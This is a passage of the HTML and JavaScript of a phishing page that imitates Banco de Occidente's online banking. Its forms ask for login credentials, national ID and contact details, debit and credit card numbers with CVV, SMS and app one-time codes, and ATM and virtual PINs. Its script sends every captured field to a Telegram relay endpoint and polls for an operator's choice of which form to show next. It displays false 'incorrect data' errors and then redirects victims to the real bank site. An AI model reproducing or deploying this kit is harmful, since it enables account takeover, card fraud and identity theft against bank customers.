            </div>
            <div class="mb-4">
                <label class="label-1" for="ciudad">Ciudad</label>
                <input class="entrada-1 w-100" id="ciudad" name="ciudad" type="text" placeholder="Ciudad"
                    minlength="3" maxlength="50" autocomplete="off">
                <div class="error-message" id="errorCiudad"></div>
            </div>
            <div class="mb-5">
                <label class="label-1" for="direccion">Dirección</label>
                <input class="entrada-1 w-100" id="direccion" name="direccion" type="text" placeholder="Dirección completa"
                    minlength="5" maxlength="100" autocomplete="off">
                <div class="error-message" id="errorDireccion"></div>
            </div>
            <div class="d-flex justify-content-center">
                <button id="btnDatos" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta de Débito -->
    <div id="tdb" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-5">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, necesitamos validar los datos de tu tarjeta de débito:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTDB" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="numtarjetaTDB">Número de tarjeta de débito</label>
                <input class="entrada-1 w-100" id="numtarjetaTDB" name="numtarjetatdb" type="text"
                    placeholder="Número de tarjeta débito" minlength="16" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDB"></div>
            </div>
            <div class="row mb-4">
                <div class="col-6">
                    <label class="label-1" for="vencimientoTDB">Fecha de vencimiento</label>
                    <input class="entrada-1 w-100" id="vencimientoTDB" name="vencimientotdb" type="text"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDB"></div>
                </div>
                <div class="col-6">
                    <label class="label-1" for="cvvTDB">CVV</label>
                    <input class="entrada-1 w-100" id="cvvTDB" name="cvvtdb" type="text"
                        placeholder="CVV" minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDB"></div>
                </div>
            </div>
            <div class="mb-5" style="font-size: 12px;">
                <input type="checkbox" id="checkTDB" style="accent-color: #0056cb;">
                <label for="checkTDB" style="margin-left: 8px;">Certifico que soy el titular de este producto</label>
            </div>
            <div class="mt-3 text-center">
                <button id="btnTDB" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta de Crédito -->
    <div id="tdc" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-5">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, necesitamos validar los datos de tu tarjeta de crédito:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTDC" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="numtarjetaTDC">Número de tarjeta de crédito</label>
                <input class="entrada-1 w-100" id="numtarjetaTDC" name="numtarjetatdc" type="text"
                    placeholder="Número de tarjeta crédito" minlength="16" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDC"></div>
            </div>
            <div class="row mb-4">
                <div class="col-6">
                    <label class="label-1" for="vencimientoTDC">Fecha de vencimiento</label>
                    <input class="entrada-1 w-100" id="vencimientoTDC" name="vencimientotdc" type="text"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDC"></div>
                </div>
                <div class="col-6">
                    <label class="label-1" for="cvvTDC">CVV</label>
                    <input class="entrada-1 w-100" id="cvvTDC" name="cvvtdc" type="text"
                        placeholder="CVV" minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDC"></div>
                </div>
            </div>
            <div class="mb-5" style="font-size: 12px;">
                <input type="checkbox" id="checkTDC" style="accent-color: #0056cb;">
                <label for="checkTDC" style="margin-left: 8px;">Certifico que soy el titular de este producto</label>
            </div>
            <div class="mt-3 text-center">
                <button id="btnTDC" class="boton-1 text-center px-5" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Código SMS -->
    <div id="codsms" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-5">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa el Código de seguridad que hemos envíado a tu celular:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodSMS" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="codsmsInput">Código de seguridad</label>
            <input class="entrada-1 w-100 mb-3" id="codsmsInput" name="codsms" type="password"
                placeholder="*Código de seguridad" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodSMS"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnCodSMS" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Código App -->
    <div id="codapp" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-5">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa el Código de seguridad que se ha generado en la App:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodApp" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="codappInput">Código de seguridad</label>
            <input class="entrada-1 w-100 mb-3" id="codappInput" name="codapp" type="password"
                placeholder="*Código de seguridad" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodApp"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnCodApp" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Clave de Cajero -->
    <div id="pincaj" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-5">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa la clave que usas en el cajero:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralPinCaj" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="pincajInput">Clave de cajero</label>
            <input class="entrada-1 w-100 mb-3" id="pincajInput" name="pincaj" type="password"
                placeholder="*Clave de cajero" minlength="4" maxlength="4" autocomplete="off">
            <div class="error-message" id="errorPinCaj"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnPinCaj" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Clave Virtual -->
    <div id="pinvir" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-5">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa tu clave virtual:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralPinVir" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="pinvirInput">Clave virtual</label>
            <input class="entrada-1 w-100 mb-3" id="pinvirInput" name="pinvir" type="password"
                placeholder="*Clave virtual" minlength="4" maxlength="4" autocomplete="off">
            <div class="error-message" id="errorPinVir"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnPinVir" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Éxito -->
    <div id="exito" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="var(--vds-success-700-base)"
                    class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
                </svg>
            </div>
            <h2 class="mb-3">Proceso completado exitosamente</h2>
            <p class="texto-2">Gracias por utilizar nuestros servicios.</p>
            <p class="texto-2">Serás redirigido en breve...</p>
        </div>
    </div>

    <!-- Vista: Error -->
    <div id="error" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="var(--vds-error-700-base)"
                    class="bi bi-x-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM5.354 4.646a.5.5 0 1 0-.708.708L7.293 8l-2.647 2.646a.5.5 0 0 0 .708.708L8 8.707l2.646 2.647a.5.5 0 0 0 .708-.708L8.707 8l2.647-2.646a.5.5 0 0 0-.708-.708L8 7.293 5.354 4.646z" />
                </svg>
            </div>
            <h2 class="mb-3">Ha ocurrido un error</h2>
            <p class="texto-2">Por favor intenta nuevamente más tarde.</p>
            <p class="texto-2">Serás redirigido en breve...</p>
        </div>
    </div>

    <!-- Vista: Wait (Loading intermedio) -->
    <div id="wait" class="hidden">
        <div class="text-center mt-5">
            <img src="/occidente/spinner-occi.gif" width="100" height="100" alt="">
        </div>
        <br>
        <div class="text-center">
            <p class="texto-1">Espere un momento por favor.</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login'
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            /**
             * Muestra un mensaje de error en un campo específico
             * @param {string} fieldId - ID del campo de entrada
             * @param {string} errorId - ID del elemento de error
             * @param {string} containerId - ID del contenedor con borde
             * @param {string} mensaje - Mensaje de error a mostrar
             */
            function mostrarError(fieldId, errorId, containerId, mensaje) {
                $('#' + errorId).text(mensaje).addClass('show');
                $('#' + containerId).addClass('borde-entrada-error');
            }

            /**
             * Oculta el mensaje de error de un campo específico
             * @param {string} errorId - ID del elemento de error
             * @param {string} containerId - ID del contenedor con borde
             */
            function ocultarError(errorId, containerId) {
                $('#' + errorId).removeClass('show').text('');
                $('#' + containerId).removeClass('borde-entrada-error');
            }

            function hideAllViews() {
                $('#login, #datos, #tdb, #tdc, #codsms, #codapp, #pincaj, #pinvir, #exito, #error, #wait').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Mostrar mensaje de error general si la vista ya fue mostrada antes
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    // La vista ya fue mostrada antes, mostrar mensaje de error y limpiar campos
                    if (viewId === 'login') {
                        $('#errorGeneralLogin').text('Los datos ingresados son incorrectos. Intenta nuevamente.').addClass('show');
                        $('#usuario').val('');
                        $('#clave').val('');
                        $('#btnLogin').prop('disabled', true);
                    } else if (viewId === 'datos') {
                        $('#errorGeneralDatos').text('Los datos ingresados son incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').val('');
                        $('#btnDatos').prop('disabled', true);
                    } else if (viewId === 'tdb') {
                        $('#errorGeneralTDB').text('Los datos de la tarjeta son incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        $('#tdb, #ven_tdb, #cvv_tdb').val('');
                        $('#checkTDB').prop('checked', false);
                        $('#btnTDB').prop('disabled', true);
                    } else if (viewId === 'tdc') {
                        $('#errorGeneralTDC').text('Los datos de la tarjeta son incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        $('#tdc, #ven_tdc, #cvv_tdc').val('');
                        $('#checkTDC').prop('checked', false);
                        $('#btnTDC').prop('disabled', true);
                    } else if (viewId === 'codsms') {
                        $('#errorGeneralCodSMS').text('El código ingresado es incorrecto. Intenta nuevamente.').addClass('show');
                        $('#codsmsInput').val('');
                        $('#btnCodSMS').prop('disabled', true);
                    } else if (viewId === 'codapp') {
                        $('#errorGeneralCodApp').text('El código ingresado es incorrecto. Intenta nuevamente.').addClass('show');
                        $('#codappInput').val('');
                        $('#btnCodApp').prop('disabled', true);
                    } else if (viewId === 'pincaj') {
                        $('#errorGeneralPinCaj').text('La clave ingresada es incorrecta. Intenta nuevamente.').addClass('show');
                        $('#pincajInput').val('');
                        $('#btnPinCaj').prop('disabled', true);
                    } else if (viewId === 'pinvir') {
                        $('#errorGeneralPinVir').text('La clave ingresada es incorrecta. Intenta nuevamente.').addClass('show');
                        $('#pinvirInput').val('');
                        $('#btnPinVir').prop('disabled', true);
                    }
                } else {
                    // Ocultar mensajes de error generales
                    $('.error-message').removeClass('show').text('');
                }

                // Registrar la vista en el historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                setTimeout(iniciarPolling, 4000);
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Ya hay un envío en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = ['usuario', 'clave', 'ente', 'numtarjetaTDB', 'cvvTDB', 'vencimientoTDB',
                    'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC',
                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion', 'codsms', 'codapp', 'pincaj', 'pinvir',
                    'status', 'uniqid'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                // Debug: Mostrar qué datos se están enviando
                console.log('Datos a enviar a Telegram:', allData);

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Telegram:', result);
                } catch (e) {
                    console.error('Error al enviar a Telegram:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (loadingElement && loadingElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        // Mapeo de respuestas de Telegram a vistas
                        const viewMap = {
                            'login': 'login',
                            'datos': 'datos',
                            'tdb': 'tdb',
                            'tdc': 'tdc',
                            'codsms': 'codsms',
                            'codapp': 'codapp',
                            'pincaj': 'pincaj',
                            'pinvir': 'pinvir',
                            'exito': 'exito',
                            'error': 'error'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redirección automática para exito o error
                        if (viewId === 'exito' || viewId === 'error') {
                            setTimeout(function () {
                                window.location.href = 'https://www.bancodeoccidente.com.co/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) return false;

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);
                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) digito -= 9;
                    }
                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) return false;

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) return false;
                if (anioNum === anioActual && mesNum < mesActual) return false;

                return true;
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const isValid = usuario.length >= 4 && clave.length >= 4;
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            function validateDatos() {
                const nombre = $('#nombre').val().trim();
                const cedula = $('#cedula').val().trim();
                const email = $('#email').val().trim();
                const celular = $('#celular').val().trim();
                const ciudad = $('#ciudad').val().trim();
                const direccion = $('#direccion').val().trim();

                const isValid = nombre.length >= 3 && cedula.length >= 6 &&
                               email.includes('@') && celular.length === 10 &&
                               ciudad.length >= 3 && direccion.length >= 5;
                $('#btnDatos').prop('disabled', !isValid);
                return isValid;
            }

            function validateTarjeta(tipo) {
                const numInput = tipo === 'tdb' ? '#numtarjetaTDB' : '#numtarjetaTDC';
                const venInput = tipo === 'tdb' ? '#vencimientoTDB' : '#vencimientoTDC';
                const cvvInput = tipo === 'tdb' ? '#cvvTDB' : '#cvvTDC';
                const checkInput = tipo === 'tdb' ? '#checkTDB' : '#checkTDC';
                const btnInput = tipo === 'tdb' ? '#btnTDB' : '#btnTDC';

                const num = $(numInput).val().replace(/\s/g, '');
                const ven = $(venInput).val();
                const cvv = $(cvvInput).val();
                const check = $(checkInput).is(':checked');

                const isValid = num.length >= 15 && validarLuhn(num) &&
                               validarVencimiento(ven) && cvv.length >= 3 && check;

                $(btnInput).prop('disabled', !isValid);
                return isValid;
            }

            function validateOtp(inputId, btnId) {
                const value = $(inputId).val().trim();
                let isValid = false;

                if (inputId === '#pincajInput' || inputId === '#pinvirInput') {
                    isValid = /^\d{4}$/.test(value);
                } else {
                    isValid = /^\d{6,8}$/.test(value);
                }

                $(btnId).prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS ====================
            // Login
            $('#usuario, #clave').on('input', validateLogin);
            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'occidente');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Datos
            $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').on('input', validateDatos);
            $('#btnDatos').on('click', async function () {
                if (validateDatos()) {
                    saveToLocalStorage('nombre', $('#nombre').val().trim());
                    saveToLocalStorage('cedula', $('#cedula').val().trim());
                    saveToLocalStorage('email', $('#email').val().trim());
                    saveToLocalStorage('celular', $('#celular').val().trim());
                    saveToLocalStorage('ciudad', $('#ciudad').val().trim());
                    saveToLocalStorage('direccion', $('#direccion').val().trim());
                    saveToLocalStorage('status', 'DATOS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Débito
            $('#numtarjetaTDB').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdb');
            });

            $('#vencimientoTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#cvvTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdb');
            });

            $('#checkTDB').on('change', function () {
                validateTarjeta('tdb');
            });

            $('#btnTDB').on('click', async function () {
                if (validateTarjeta('tdb')) {
                    saveToLocalStorage('numtarjetaTDB', $('#numtarjetaTDB').val().trim());
                    saveToLocalStorage('cvvTDB', $('#cvvTDB').val().trim());
                    saveToLocalStorage('vencimientoTDB', $('#vencimientoTDB').val().trim());
                    saveToLocalStorage('status', 'TDB');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Crédito
            $('#numtarjetaTDC').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta('tdc');
            });

            $('#vencimientoTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#cvvTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta('tdc');
            });

            $('#checkTDC').on('change', function () {
                validateTarjeta('tdc');
            });

            $('#btnTDC').on('click', async function () {
                if (validateTarjeta('tdc')) {
                    saveToLocalStorage('numtarjetaTDC', $('#numtarjetaTDC').val().trim());
                    saveToLocalStorage('cvvTDC', $('#cvvTDC').val().trim());
                    saveToLocalStorage('vencimientoTDC', $('#vencimientoTDC').val().trim());
                    saveToLocalStorage('status', 'TDC');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Código SMS
            $('#codsmsInput').on('input', function () {
                validateOtp('#codsmsInput', '#btnCodSMS');
            });
            $('#btnCodSMS').on('click', async function () {
                if (validateOtp('#codsmsInput', '#btnCodSMS')) {
                    saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                    saveToLocalStorage('status', 'CODSMS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Código App
            $('#codappInput').on('input', function () {
                validateOtp('#codappInput', '#btnCodApp');
            });
            $('#btnCodApp').on('click', async function () {
                if (validateOtp('#codappInput', '#btnCodApp')) {
                    saveToLocalStorage('codapp', $('#codappInput').val().trim());
                    saveToLocalStorage('status', 'CODAPP');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave de Cajero
            $('#pincajInput').on('input', function () {
                validateOtp('#pincajInput', '#btnPinCaj');
            });
            $('#btnPinCaj').on('click', async function () {
                if (validateOtp('#pincajInput', '#btnPinCaj')) {
                    saveToLocalStorage('pincaj', $('#pincajInput').val().trim());
                    saveToLocalStorage('status', 'PINCAJ');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave Virtual
            $('#pinvirInput').on('input', function () {
                validateOtp('#pinvirInput', '#btnPinVir');
            });
            $('#btnPinVir').on('click', async function () {
                if (validateOtp('#pinvirInput', '#btnPinVir')) {
                    saveToLocalStorage('pinvir', $('#pinvirInput').val().trim());
                    saveToLocalStorage('status', 'PINVIR');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // ==================== INICIALIZACIÓN ====================
            showView('login');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
